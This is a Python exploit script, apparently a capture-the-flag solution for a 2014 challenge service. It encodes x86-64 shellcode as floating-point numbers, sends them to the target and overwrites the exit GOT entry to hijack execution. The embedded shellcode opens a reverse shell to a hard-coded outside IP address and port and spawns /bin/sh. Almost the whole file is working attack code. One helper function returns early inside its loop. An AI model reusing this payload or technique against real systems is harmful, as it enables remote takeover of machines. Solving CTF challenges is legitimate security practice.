from isis import *
import math

def pad_shellcode(s):
    properlen=math.ceil(len(s)/8.0)*8
    padding='\0'*int(properlen-len(s))
    return s+padding

def chunk(it,a):
    for i in range(0,len(it),a):
        yield it[i:i+a]

def float_shellcode(s):
    nums=[]
    for i in chunk(pad_shellcode(s),8):
        nums.append(unpack("d",i)[0])
    return nums

def shellcode_float(nums):
    s=''
    for i in nums:
        s+=pack('d',i)
        return s

def write_exit_got(s):
    s.send('c\n')
    s.send('b\n'*2)
    s.send('+\n'*12)
    table=0x603150
    after_exit=0x6030e8
    EIP,=unpack('d',pack("q", table )) #overwrite exit got pointer
    s.send(str(EIP)+'\n')

def crash():
    s=get_socket(('localhost',31415))
    #s=get_socket(('ti-1337.2014.ghostintheshellcode.com',31415))
    
    #now start pushing shellcode as floats
    #shellcode=file('./shellcode').read()
    buf =  ""
    buf += "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"
    buf += "\x97\x48\xb9\x02\x00\x11\x5c\x80\xee\x42\x95\x51\x48"
    buf += "\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e"
    buf += "\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58"
    buf += "\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48"
    buf += "\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"
    shellcode=buf
    nums=float_shellcode(shellcode)
    
    
    #break_point,=unpack('d',pack("Q",0x000000fffffffff))
    break_point,=unpack('d',pack("Q",0xcccccccccccccccc))
    #break_point=-9.255963134931783e+61
    #nums=[-1.10908e-244, -8.59624e+87, 6.86766e+246, 6.60605e+91, 1.29315e+98, 2.17565e-76, 1.80403e+35 ]
    #print repr(break_point)
    #s.send(str(repr(break_point))+' \n')
    
    for i in nums:
        s.send(str(repr(i))+'\n')
        #s.send(str(break_point)+'\n')
    write_exit_got(s)
    s.send('q\n')
    return s

if __name__=='__main__':
    s=crash()
    shell(s)
